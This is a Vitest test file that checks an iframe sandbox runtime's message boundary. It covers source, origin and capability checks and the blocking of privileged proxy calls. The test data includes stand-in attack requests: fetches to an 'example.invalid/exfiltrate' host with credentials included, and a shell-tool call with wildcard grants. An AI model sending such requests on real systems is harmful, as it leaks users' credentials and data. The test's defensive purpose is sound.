import { afterEach, describe, expect, it, vi } from 'vitest';
import { JSDOM } from 'jsdom';
import { SandboxRuntime } from '../ui/src/titan2/sandbox/SandboxRuntime.js';

let dom: JSDOM | undefined;
let runtime: SandboxRuntime | undefined;
afterEach(() => { runtime?.destroy(); dom?.window.close(); vi.unstubAllGlobals(); vi.restoreAllMocks(); });
async function fixture() {
    dom = new JSDOM('<iframe sandbox="allow-scripts"></iframe><iframe id="other" sandbox="allow-scripts"></iframe>', { url: 'http://127.0.0.1/' });
    const win = dom.window;
    const fetch = vi.fn(async () => new Response('fixture vendor', { status: 200 }));
    vi.stubGlobal('window', win); vi.stubGlobal('document', win.document);
    vi.stubGlobal('MutationObserver', win.MutationObserver); vi.stubGlobal('localStorage', win.localStorage);
    vi.stubGlobal('fetch', fetch);
    const frame = win.document.querySelector('iframe')!;
    const other = win.document.getElementById('other') as HTMLIFrameElement;
    runtime = new SandboxRuntime(frame);
    await vi.waitFor(() => expect(frame.srcdoc).toContain('fixture vendor'));
    fetch.mockClear();
    const post = vi.spyOn(frame.contentWindow!, 'postMessage').mockImplementation(() => {});
    const capability = () => {
        const match = /const capability = ("[^"\n]+");/.exec(frame.srcdoc);
        expect(match).not.toBeNull();
        return JSON.parse(match![1]) as string;
    };
    const call = (type: string, payload: unknown, options: { source?: MessageEventSource | null; capability?: string; origin?: string } = {}) => win.dispatchEvent(new win.MessageEvent('message', {
        source: options.source === undefined ? frame.contentWindow : options.source,
        origin: options.origin ?? 'null', data: { type, id: 99, capability: options.capability, payload },
    }));
    return { frame, other, fetch, post, capability, call, win };
}

describe('owned sandbox message boundary', () => {
    it('refuses other-window and missing-capability messages before parent fetch', async () => {
        const { frame, other, fetch, call } = await fixture();
        const payload = { endpoint: '/fixture', body: { content: 'fixture' } };
        call('api', payload, { source: other.contentWindow });
        call('api', payload, { source: frame.contentWindow });
        call('api', payload, { source: null });
        await Promise.resolve();
        expect(fetch).not.toHaveBeenCalled();
    });

    it('requires exact live source, opaque origin and unguessable per-frame capability for private state', async () => {
        const { other, fetch, post, capability, call } = await fixture();
        const cap = capability();
        expect(cap).toMatch(/^[a-f0-9]{64}$/);
        call('state', { action: 'set', key: 'fixture', value: 1 }, { source: other.contentWindow, capability: cap });
        call('state', { action: 'set', key: 'fixture', value: 2 }, { capability: cap, origin: 'https://example.invalid' });
        call('state', { action: 'set', key: 'fixture', value: 3 }, { capability: 'wrong-capability' });
        expect(post).not.toHaveBeenCalled();
        call('state', { action: 'set', key: 'fixture', value: 42 }, { capability: cap });
        call('state', { action: 'get', key: 'fixture' }, { capability: cap });
        await vi.waitFor(() => expect(post).toHaveBeenCalledWith(expect.objectContaining({ type: 'result', payload: 42, capability: cap }), '*'));
        expect(fetch).not.toHaveBeenCalled();
    });

    it.each([
        ['api', { endpoint: '/api/tools/run', body: { name: 'shell', args: {} }, grants: ['*'] }],
        ['api', { endpoint: '/api/config', body: { content: 'fixture' } }],
        ['fetch', { url: '//example.invalid/exfiltrate', options: { credentials: 'include' } }],
        ['fetch', { url: '/\\example.invalid/exfiltrate' }],
        ['fetch', { url: '/api/config' }],
        ['canvas', { action: 'removeWidget', id: 'another-widget' }],
    ])('security-holds privileged %s proxy before auth, fetch or callback', async (type, payload) => {
        const { fetch, post, capability, call, win } = await fixture();
        const handler = vi.fn();
        runtime!.setMessageHandler(handler);
        const storage = vi.spyOn(win.localStorage, 'getItem');
        call(type, payload, { capability: capability() });
        await vi.waitFor(() => expect(post).toHaveBeenCalledWith(expect.objectContaining({ type: 'error', error: expect.stringContaining('security hold') }), '*'));
        expect(fetch).not.toHaveBeenCalled();
        expect(storage).not.toHaveBeenCalled();
        expect(handler).not.toHaveBeenCalled();
    });

    it('ignores messages from a removed frame and invalidates its state on destroy', async () => {
        const { frame, post, capability, call } = await fixture();
        const cap = capability();
        frame.remove();
        call('state', { action: 'get', key: 'fixture' }, { capability: cap });
        runtime!.destroy();
        call('state', { action: 'get', key: 'fixture' }, { capability: cap });
        expect(post).not.toHaveBeenCalled();
    });
});
